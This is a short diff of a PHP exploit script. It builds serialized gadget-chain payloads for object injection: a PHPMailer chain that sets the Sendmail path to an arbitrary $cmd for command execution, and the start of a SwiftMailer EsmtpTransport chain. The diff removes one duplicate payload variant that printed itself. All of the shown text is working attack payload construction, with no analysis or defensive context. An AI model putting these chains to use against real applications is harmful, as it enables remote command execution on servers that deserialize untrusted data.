@@ -12,13 +12,6 @@ $o1 .= 's:6:"Mailer";s:8:"sendmail";';
 $o1 .= 's:8:"Sendmail";s:'.strlen($cmd).':"'.$cmd.'";}';
 $o1 .= 'i:1;s:8:"postSend";}}}';
 
-
-$o3 .= 's:11:"Debugoutput";a:2:{i:0;O:29:"PHPMailer\\PHPMailer\\PHPMailer":2:{';
-$o3 .= 's:6:"Mailer";s:8:"sendmail";';
-$o3 .= 's:8:"Sendmail";s:'.strlen($cmd).':"'.$cmd.'";}';
-$o3 .= 'i:1;s:8:"postSend";}}}';
-echo $o3;
-
 $o2  = 'O:30:"Swift_Transport_EsmtpTransport":3:{';
 $o2 .= 's:10:"'.chr(0).'*'.chr(0).'started";b:1;';
 $o2 .= 's:18:"'.chr(0).'*'.chr(0).'eventDispatcher";O:34:"Swift_Events_SimpleEventDispatcher":0:{}';
